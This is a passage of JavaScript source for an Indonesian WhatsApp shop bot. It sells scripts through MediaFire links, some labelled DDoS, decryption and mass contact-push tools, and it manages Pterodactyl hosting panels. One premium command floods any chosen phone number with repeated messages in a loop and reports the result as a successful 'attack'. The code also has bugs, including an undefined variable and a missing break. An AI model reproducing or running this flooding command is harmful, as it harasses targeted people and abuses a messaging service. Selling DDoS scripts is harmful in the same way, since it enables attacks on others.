       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/bdtbszlg69old31/Jpm+X+PushKntk+V1.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv2': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ilam1m6wsgxqh6b/Jpm+X+PushKntk+V2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv3': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/o1sj4k0aeb2frm0/Jpm+X+PushKntk+V3.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscthemav1': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscthemav2': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscnowa': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscwebp': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/i5fgc58laqm1vp8/SC+BOT+WEBP.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buysctesmoni': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscddos': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbukaenc': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Sabar`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buymodule': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscpm2': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
   case 'bukti':{
           let jumlah = args[0]
           if (!jumlah) return reply('Jumblah nya?')
reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT')
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, { text: `*ADA YANG DEPOSIT NIH*\n*SEJUMLAH ${jumlah} DARI @${sender.split('@')[0]}*\n*INGIN ACC DEPOSIT? KETIK*\n*${prefix}acc MAU NOLAK? BIARIN AJA*`, mentions: [sender]}, { quoted: hw })
        }
        break
           case 'reportbug':{
           let ripotbug = args[0]
           if (!ripotbug) return reply('Teksnya?')
reply('Oke Kak Reportmu Sudah Terkirim Ke Owner')
Biiofc.sendMessage('62895354709030@s.whatsapp.net', { text: `*===[ REPORT ]===*\n*TEXT : ${jumlah} DARI : @${sender.split('@')[0]}*\n*Ketik ${prefix}accreport Jika Ingin Menerima Laporan*\n*${prefix}acc Jika Ingin Menolak Report Biarin Ajah 🗿*`, mentions: [sender]}, { quoted: hw })
        }
        break
        case 'accreport': {
                    let messageText = `_Terima Kasih Atas Laporan Anda Dan Laporan Anda Diterima Tunggu 1 - 2 Hari Agar Owner Bisa Memperbaikinya`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  Biiofc.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc berhasil!');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break
                case 'saldo':{
reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo hanya bisa untuk beli di bot_
_Tidak bisa ditarik atau transfer_!`)
}
break
          case 'qris': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e053eb547a3de107a5471.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'gopay': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e053eb547a3de107a5471.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'dana': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e053eb547a3de107a5471.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
          case 'ovo': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e053eb547a3de107a5471.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case "deposit":
        depo = `PILIH PAYMENT DEPOSIT DIBAWAH DAN SEBUTKAN NOMINALNYA
contoh : ${prefix}dana 5000

${prefix}dana✅
${prefix}gopay✅
${prefix}ovo❌
${prefix}qris✅`
        Biiofc.sendMessage(from, {text : depo}, {quoted : hw}) 
        break      
    case "buyvps": {
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textsrv = `*Hi @${sender.split("@")[0]} 👋*
*── 「 RIDZ STORE 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST VPS DIGITALOCEAN ｣*
⭔●${prefix}buypaketvps1g1c
⭔●${prefix}buypaketvps2g1c
⭔●${prefix}buypaketvps2g2c
⭔●${prefix}buypaketvps4g2c
⭔●${prefix}buypaketvps8g4c

_*NOTE:*_ pilih salah satu yang saldo kamu cukup

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
    case "buysrv": {
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textsrv = `*Hi @${sender.split("@")[0]} 👋*
*── 「 RIDZ STORE 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST SERVER ｣*
⭔●${prefix}srvpaket1 _*Ram 1GB/1GB*_
⭔●${prefix}srvpaket2 _*Ram 2GB/2GB*_
⭔●${prefix}srvpaket3 _*Ram 3GB/3GB*_
⭔●${prefix}srvpaket4 _*Ram 4GB/4GB*_
⭔●${prefix}srvpaket5 _*Ram 5GB/5GB*_
⭔●${prefix}srvpaket6 _*Ram UNLI/UNLI*_
⭔●${prefix}srvpaket7 _*Ram 6GB/6GB*_
⭔●${prefix}srvpaket8 _*Ram 7GB/7GB*_
⭔●${prefix}srvpaket9 _*Ram 8GB/8GB*_
⭔●${prefix}srvpaket10 _*Ram 9GB/9GB*_

_*NOTE:*_ pilih salah satu yang saldo kamu cukup

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
                case 'acc': case 'addsaldo':{
if (!isOwner) return reply('NGAPAIN YATIM JAHANAM?')
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`「 *SALDO USER* 」
⭔ID: @${sender.split("@")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
                }
        case 'kirim': {
                    let messageText = `DONE KAK DEPOSIT SUDAH BERHASIL SEJUMLAH  ${q.split(",")[1]} TELAH DITAMBAHKAN KE SALDO ANDA CEK SALDO KETIK .SALDO TERIMAKASIH`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  Biiofc.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc Berhasil Tuan✅');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break;
        //Diatas case kirim jangan dihapus ntr error
        case 'unlitet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '😎': case '😈': case '🗿':  {
   if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000) 
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffOffcial`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/tds4youshop", 
"sourceUrl": "https://lynk.id/tds4youshop" }}}, { quoted: m })
}
break
        //bagian panel
        case 'buyakn':{
if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!q.split(',')[0]) return reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} contoh@gmail.com,contoh`)
if (!q.split(',')[1]) return reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} contoh@gmail.com,contoh`)
let d = (await Biiofc.onWhatsApp(sender.split('@')[0]))[0] || {}
let psswd = d.exists ? require("crypto").randomBytes(5).toString('hex') : username+'7739'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": q.split(',')[0],
"username": q.split(',')[1],
"first_name": q.split(',')[1],
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
Biiofc.sendMessage(from, { text: `*SUCCESSFULLY BUY USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n*UUID:* ${res.attributes.uuid}\n*USERNAME:* ${res.attributes.username}\n*EMAIL:* ${res.attributes.email}\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n*CREATED AT:* ${res.attributes.created_at}\n\n*Password telah dikirim ke @${sender.split('@')[0]}*`, mentions: [sender]}, { quoted: m })
    Biiofc.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${res.attributes.email}\n*USERNAME:* ${res.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *CLIENT RIDZ STORE* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\nUntuk Membeli server ketik ${prefix}buysrv ya\n\n#TERIMAKASIH`,})
}    
        
        break
        case "panel": {
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*

CPANEL 
BY RIDZ STORE

CARA ADD USER PANEL :
ram user,nomer

contoh : .1gb DvdzZ-XdzZ,62895354709030

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case 'reinstall': {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case 'updatesrv': {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan:
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${week} ${date}
UPDATED AT: ${server.updated_at}`)
}
break
                case "listsrv": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
              case "listusr": {
  if (!isOwner) return reply(mess.only.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv": {
      if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr": {
  if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                case "addusr": {

if (!isOwner) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await Biiofc.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
